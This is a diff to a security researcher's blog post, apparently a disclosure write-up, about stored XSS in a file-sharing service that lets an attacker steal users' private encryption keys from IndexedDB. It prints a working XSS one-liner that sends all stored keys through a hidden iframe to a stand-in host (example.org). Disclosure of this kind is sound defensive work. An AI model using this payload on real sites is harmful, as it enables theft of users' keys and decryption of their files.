@@ -41,9 +41,8 @@ want to skip to the PoC [video](#video) instead._
 
 ## XSS
 After making an account, I started testing with some basic well-known techniques.
-About 10 minutes into testing I discovered that persistent/stored
-[cross-site scripting][xss] was possible through the account and company name
-fields.
+Soon I discovered that persistent/stored [cross-site scripting][xss] was possible
+through the account and company name fields.
 
 The service allows you to create a file request. You'll then be provided a link
 to send to someone, or you can send this by e-mail through their website.
@@ -65,8 +64,8 @@ message will appear as soon as someone opens any of your request links.
 
 ![XSS alert screenshot on request page](./xss-alert.png)
 
-That's some nasty stuff! The question is, what significant things can we do with
-this issue?
+This means we can execute our own code on a targets machine.  That's some nasty
+stuff! The question is, what significant things can we do with this issue?
 
 ## Local private keys
 The service uses client-side asymmetric encryption to secure your files. Because
@@ -89,7 +88,7 @@ I came this far in about half an hour. It's all quite simple:
 ```javascript
 var dbReq = indexedDB.open("companyname");
 dbReq.onsuccess = () => {
-    var store = dbReq.result.transaction(["keys"]).objectStore("keys").get("50_private_key");
+    var store = dbReq.result.transaction(["keys"]).objectStore("keys").get("52_private_key");
     store.onsuccess = () => alert(store.result.pem);
 };
 ```
@@ -114,7 +113,7 @@ JavaScript is quite verbose with making a request, so some serious
 [golfing][codegolf] would be required.
 
 Soon I found out [jQuery][jquery] was included in the application, which allows
-making super simple and short [Ajax][ajax] requests. Brilliant!  
+making super simple and short [Ajax][ajax] requests. Brilliant!
 
 This didn't work out in the end though because of some set [CORS][cors] headers,
 being a nice method for protecting against these kinds of things.
@@ -124,7 +123,7 @@ Fun fact, this doesn't work against non-[Ajax][ajax] requests. Opting for a
 choose to use [`iframes`][iframe]. I suffixed the data to the end of the URL
 like `//example.com/?k=DATA`, and silently added an `iframe` to the page with
 this link. The browser immediately loads this `iframe`, sending us our precious
-data. We're now just a little more than an hour into this, and this is all I needed:
+data. This is what we need:
 
 ```javascript
 $('body').append(
@@ -144,9 +143,8 @@ Hurray! We're now remotely collecting someone's private key!
 Now that we've implemented these steps, let's build a proof of concept.
 
 With some effort, I compressed the code from above into the following one-liner.
-This took me some time, but completed this in about 1:30 after starting. With my
-own short domain, it counts 250 characters, just below the 255 character limit.
-Beautiful!
+With my own short domain, it counts 250 characters, just below the 255 character
+limit. Beautiful!
 
 ```html
 <script>setTimeout(()=>indexedDB.open("companyname").onsuccess=(a)=>a.target.result.transaction(["keys"]).objectStore("keys").getAll().onsuccess=(b)=>$('body').append('<iframe src="//example.org?k='+btoa(JSON.stringify(b.target.result))+'">'),1);</script>
@@ -171,7 +169,6 @@ I've recorded a simple video showing off the proof of concept.
 
 <video controls><source src="https://uploads.timvisee.com/p/stealing-private-keys-from-secure-file-sharing-service-poc-video.webm" type="video/webm"><source src="https://uploads.timvisee.com/p/stealing-private-keys-from-secure-file-sharing-service-poc-video.mp4" type="video/mp4">Your browser does not support HTML5 video :(</video>
 
-All in all, it took me about 2 hours to figure all this out.
 Let's start fixing this.
 
 ## Fixed in an hour
